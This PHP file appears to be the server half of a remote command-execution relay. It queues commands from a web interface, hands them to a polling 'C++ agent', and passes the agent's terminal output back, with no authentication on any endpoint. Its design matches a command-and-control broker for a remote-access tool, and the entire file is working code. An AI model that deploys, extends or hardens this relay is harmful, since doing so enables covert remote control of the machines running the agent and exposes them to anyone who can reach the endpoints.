<?php
file_put_contents(
    "requests.log",
    date("Y-m-d H:i:s") . " " .
    $_SERVER['REQUEST_METHOD'] . " " .
    $_SERVER['REQUEST_URI'] . " UA=" .
    $_SERVER['HTTP_USER_AGENT'] . "\n",
    FILE_APPEND
);
// Force absolute directory resolution to ensure stable read/writes across cloud nodes
$inputFile = dirname(__FILE__) . '/input.txt';
$outputFile = dirname(__FILE__) . '/output.txt';

// Ensure temporary data transaction engines exist safely on disk
if (!file_exists($inputFile)) file_put_contents($inputFile, '');
if (!file_exists($outputFile)) file_put_contents($outputFile, '');

// 1. WEB INTERFACE: Sends a new command to execute
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['command'])) {
    $cmd = $_POST['command'] . "\n";
    file_put_contents($inputFile, $cmd, LOCK_EX); // Overwrites with new command
    echo "Command queued.";
    exit;
}

// 2. C++ AGENT: Sends terminal outcome data back to server
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['output'])) {
    $out = $_POST['output'];
    file_put_contents($outputFile, $out, FILE_APPEND | LOCK_EX); // Append execution data
    echo "Output acknowledged.";
    exit;
}

// 3. WEB INTERFACE: Polls for new output string
if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['action']) && $_GET['action'] === 'get_output') {
    $content = file_get_contents($outputFile);
    if (!empty($content)) {
        echo $content;
        file_put_contents($outputFile, ''); // Clear file after reading it
    }
    exit;
}

// 4. C++ AGENT: Polls to see if the user issued a command
if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['action']) && $_GET['action'] === 'get_input') {
    $command = file_get_contents($inputFile);
    if (!empty($command)) {
        echo $command;
        file_put_contents($inputFile, ''); // Clear command queue file after dispatching
    }
    exit;
}

// Fallback visibility state check
header('Content-Type: text/plain');
echo "Broker API online. Standby for binary client packets...";
?>
